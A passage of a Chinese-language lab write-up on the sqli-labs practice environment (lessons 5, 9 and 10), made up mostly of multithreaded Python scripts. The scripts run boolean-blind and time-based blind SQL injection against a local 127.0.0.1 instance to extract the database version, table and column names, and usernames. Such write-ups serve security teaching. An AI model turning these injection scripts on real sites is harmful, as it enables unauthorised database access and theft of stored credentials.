requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1,15):</span><br><span class="line">        for j in range(1,15):</span><br><span class="line">            payload = &quot;&#x27; and substr(version(),%d,1)=%d--+ &quot;  %(i,j)</span><br><span class="line">            dic = &#123;&quot;search&quot;:j,&quot;payload&quot;:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line">            j = j + 1</span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;.&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205311757287.png" alt="image-20220531175737242"></p>
<p><strong>测表名：python</strong></p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205312223322.png" alt="image-20220531222327234"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,10):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                payload = &quot;&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27; --+&quot; % (i, z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    global page_1</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_1 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>测字段名</strong>：在测表的payload稍微改一下就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,10):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                payload = &quot;&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema = database() limit %d,1),%d,1)=&#x27;%c&#x27; --+&quot; % (i, z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    global page_1</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_1 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205312246163.png" alt="image-20220531224616079"></p>
<p>爆账号密码：</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206011425561.png" alt="image-20220601142506421"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">        for z in range(1,94):</span><br><span class="line">            for j in range(43,90):</span><br><span class="line">                payload = &quot;&#x27; and substr((select group_concat(username) from users),%d,1)=&#x27;%c&#x27; --+ &quot; % (z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: z&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>爆密码的话改参数就行</p>
<h4 id="Less-9-10"><a href="#Less-9-10" class="headerlink" title="Less-9-10"></a><strong>Less-9</strong>-10</h4><p>\在这关不显示了，这边直接用python，原本以为基于时间的延时注入会没用效果，没想到还是能检测出来。并且验证后发现闭合符是对的</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021436598.png" alt="image-20220602143630536"></p>
<p>这边时间注入，成功验证了执行，sleep函数，也就是if语句为真。那么接下来开始利用python写exp</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021455796.png" alt="image-20220602145559733"></p>
<h5 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206030036528.png" alt="image-20220603003659464"></p>
<p>这里的闭合符为”</p>
<p>接下来就以第九关为例</p>
<p>“ and if(substr(database(),1,1)&#x3D;’s’,sleep(3),0) # </p>
<p><strong>爆数据库：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1,15):</span><br><span class="line">        for j in range(91,127):</span><br><span class="line">            payload = &quot;&#x27; and if(substr(database(),%d,1)=&#x27;%c&#x27;,sleep(3),0) --+ &quot; %(i,j)</span><br><span class="line">            dic = &#123;&quot;search&quot;:chr(j),&quot;payload&quot;:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021449857.png" alt="image-20220602144914797"></p>
<p><strong>爆出数据库版本：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1,15):</span><br><span class="line">        for j in range(1,15):</span><br><span class="line">            payload = &quot;&#x27; and if(substr(version(),%d,1)=&#x27;%d&#x27;,sleep(3),0) --+ &quot; %(i,j)</span><br><span class="line">            dic = &#123;&quot;search&quot;:j,&quot;payload&quot;:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;.&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021458124.png" alt="image-20220602145834061"></p>
<p><strong>爆出表名：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(1):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,15):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(3),0) --+&quot; % (i, z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    global page_2</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_2:</span><br><span class="line">        page_2 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_2 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这个python是我用单线程跑的，不知道为啥多线程会有并发实现的冲突</p>
<p>后续又进行研究，发现把表名爆出后，后面多余的传入+号，if语句也会为真，这里也正好做表名的分隔符用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;uname=admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema = database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(5),0) %() # &amp;passwd=adm&amp;submit=Submit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206022212452.png" alt="image-20220602221227390"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line">from threading import Lock</span><br><span class="line">lock = Lock()</span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,15):</span><br><span class="line">            for j in range(38,91):</span><br><span class="line">                lock.acquire()</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(3),0) --+&quot; % (i, z, j)</span><br><span class="line">                if j &gt;= 65:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j+32), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    global page_2</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;], end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_2 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>爆字段名</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line">from threading import Lock</span><br><span class="line">lock = Lock()</span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    global page_2</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,15):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                lock.acquire()</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(5),0) --+&quot; % (i, z, j)</span><br><span class="line">                if i &gt; page_2:</span><br><span class="line">                    page_2 = i</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: &#x27;,&#x27;&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line"></span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if dic[&quot;page&quot;] == &#x27;,&#x27;:</span><br><span class="line">        print()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;], end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_2 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206022234592.png" alt="image-20220602223456529"></p>
<p><strong>爆破账号密码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">        for z in range(1,94):</span><br><span class="line">            for j in range(43,90):</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select group_concat(username) from users),%d,1)=&#x27;%c&#x27;,sleep(5),0) --+ &quot; % (z, j)</span><br><span class="line">                if j &gt;= 65:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j+32), &quot;payload&quot;: payload&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    time_1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    time_2 = time.time()</span><br><span class="line">    if time_2 - time_1 &gt; 4:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

